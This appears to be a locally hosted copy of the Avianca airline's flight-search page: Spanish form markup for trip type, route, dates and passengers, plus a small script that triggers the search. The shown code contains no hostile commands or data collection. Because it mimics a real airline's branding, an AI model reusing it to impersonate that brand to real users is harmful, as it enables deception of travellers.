<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Avianca - Find cheap tickets and flights</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="shortcut icon" href="./assets/favicon.svg" type="image/x-icon">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:wght@300;400;500;600;700;900&display=swap" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="./css/calendar.css">
  <link rel="stylesheet" href="./css/main.css">
  <link rel="stylesheet" href="./css/normalize.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jsrsasign/10.1.0/jsrsasign-all-min.js"></script>
  <script src="./js/functions.js"></script>
</head>
<body>

  <!-- LOADER -->
  <div class="loader show">
    <img src="./assets/svg/plane-loader.gif" alt="Loading">
  </div>

  <!-- NAVBAR -->
  <nav class="navbar">
    <img class="navbar-hmenu" src="./assets/svg/hamburger_menu.png" alt="menu_h">
    <div class="navbar--logo">
      <img src="./assets/logos/avianca_full.svg" alt="logo">
    </div>
  </nav>

  <!-- MAIN CARD -->
  <section class="main">
    <div class="sp-initial-content bg-main-card">
      <div class="main--card">

        <!-- Tipo de vuelo -->
        <div id="main-type-selector" class="main--card--header">
          <form id="type-selector">
            <label class="radio-wrapper" for="ida_vuelta">
              <input type="radio" checked id="ida_vuelta" name="opcion_viaje"
                onclick="info.flightInfo.type = 1; updateLS(); updateDOM()">
              <div class="radio-circle"><div class="radio-dot"></div></div>
              <span class="radio-label">Ida y vuelta</span>
            </label>

            <label class="radio-wrapper" for="solo_ida">
              <input type="radio" id="solo_ida" name="opcion_viaje"
                onclick="info.flightInfo.type = 2; updateLS(); updateDOM()">
              <div class="radio-circle"><div class="radio-dot"></div></div>
              <span class="radio-label">Solo ida</span>
            </label>
          </form>
        </div>

        <!-- Selector -->
        <div class="main--card--body">
          <div id="main-destinations-selector">
            <div class="main--input-group" id="destinations-selector">
              <button class="btn-ig" id="btn-origin">
                <img class="btn-ig-icon" src="./assets/svg/takeoff_icon.png" alt="">
                <span class="btn-ig-label">Origen</span>
                <span class="btn-ig-text" id="btn-origin-label">Bogotá</span>
              </button>

              <img class="fd-icon" src="./assets/svg/flight-direction-icon.png" alt="↔">

              <button class="btn-ig" id="btn-destination">
                <img class="btn-ig-icon" src="./assets/svg/landing_icon.png" alt="">
                <span class="btn-ig-label">Destino</span>
                <span class="btn-ig-text" id="btn-destination-label">Cali</span>
              </button>
            </div>
          </div>

          <!-- Fechas -->
          <div class="main--input-group mt-3">
            <input class="d-none" type="date" id="date-go" readonly onclick="calender(this, 'go')">
            <button class="btn-ig" id="btn-date-go" onclick="document.querySelector('#date-go').click();">
              <img class="btn-ig-icon" src="./assets/svg/date-icon.png" alt="">
              <span class="btn-ig-label">Ida</span>
              <span class="btn-ig-text" id="btn-date-go-label">01/01/2001</span>
            </button>

            <input class="d-none" type="date" id="date-back" readonly onclick="calender(this, 'back')">
            <button class="btn-ig" id="btn-date-back" onclick="document.querySelector('#date-back').click()">
              <img class="btn-ig-icon" src="./assets/svg/date-icon.png" alt="">
              <span class="btn-ig-label">Vuelta</span>
              <span class="btn-ig-text" id="btn-date-back-label">01/01/2001</span>
            </button>
          </div>

          <!-- Pasajeros -->
          <div class="main--input-group mt-3">
            <button class="btn-ig" id="btn-passengers">
              <img class="btn-ig-icon" src="./assets/svg/add-passenger-icon.png" alt="">
              <span class="btn-ig-label">Pasajeros</span>
              <span class="btn-ig-text" id="btn-passengers-label">1</span>
            </button>
          </div>

          <!-- Selector pasajeros inline -->
          <div class="passenger-selector mt-3">
            <div>
              <p class="text-normal">Adultos</p>
              <p class="text-thin">Desde 12 años</p>
            </div>
            <div class="passenger-btn">
              <img src="./assets/svg/remove-icon.png" onclick="rmP('adult');" alt="menos">
              <h1 id="adults-label">1</h1>
              <img src="./assets/svg/add-icon.png" onclick="addP('adult');" alt="más">
            </div>
          </div>

          <div class="passenger-selector">
            <div>
              <p class="text-normal">Niños</p>
              <p class="text-thin">De 2 a 11 años</p>
            </div>
            <div class="passenger-btn">
              <img src="./assets/svg/remove-icon.png" onclick="rmP('child');" alt="menos">
              <h1 id="children-label">0</h1>
              <img src="./assets/svg/add-icon.png" onclick="addP('child');" alt="más">
            </div>
          </div>

          <div class="passenger-selector">
            <div>
              <p class="text-normal">Bebés</p>
              <p class="text-thin">Menores de 2 años</p>
            </div>
            <div class="passenger-btn">
              <img src="./assets/svg/remove-icon.png" onclick="rmP('baby');" alt="menos">
              <h1 id="babies-label">0</h1>
              <img src="./assets/svg/add-icon.png" onclick="addP('baby');" alt="más">
            </div>
          </div>

          <!-- BOTÓN BUSCAR -->
          <button id="search-flight" class="btn btn-black mt-3 w-100">Buscar</button>
        </div>
      </div>
    </div>

    <!-- PROMO SPLIT -->
    <div class="promo-split">…</div>
  </section>

  <!-- OFERTAS -->
  <section class="cards--container">…</section>

  <!-- FOOTER -->
  <footer class="site-footer">…</footer>

  <!-- SCRIPTS -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  <script src="./js/calendar.js"></script>
  <script src="./js/index.js"></script>

  <script>
  // Buscar directo con funciones de index.js
  (function(){
    const btn = document.getElementById('search-flight');
    if(btn){
      btn.addEventListener('click', function(){
        try{
          // sincronizar pasajeros
          const a = parseInt(document.getElementById('adults-label').textContent)||1;
          const c = parseInt(document.getElementById('children-label').textContent)||0;
          const b = parseInt(document.getElementById('babies-label').textContent)||0;
          const total = a+c+b;

          window.info = window.info || {};
          info.flightInfo = info.flightInfo || {};
          info.flightInfo.adults=a; info.flightInfo.children=c; info.flightInfo.babies=b;
          info.flightInfo.passengers=total; info.flightInfo.totalPassengers=total;

          if(typeof updateLS==="function") updateLS();
          if(typeof updateDOM==="function") updateDOM();

          // dispara búsqueda real
          if(typeof btnSearchFlight!=="undefined" && btnSearchFlight.click){
            btnSearchFlight.click();
          }
        }catch(e){console.error(e);}
      });
    }
  })();
  </script>
</body>
</html>
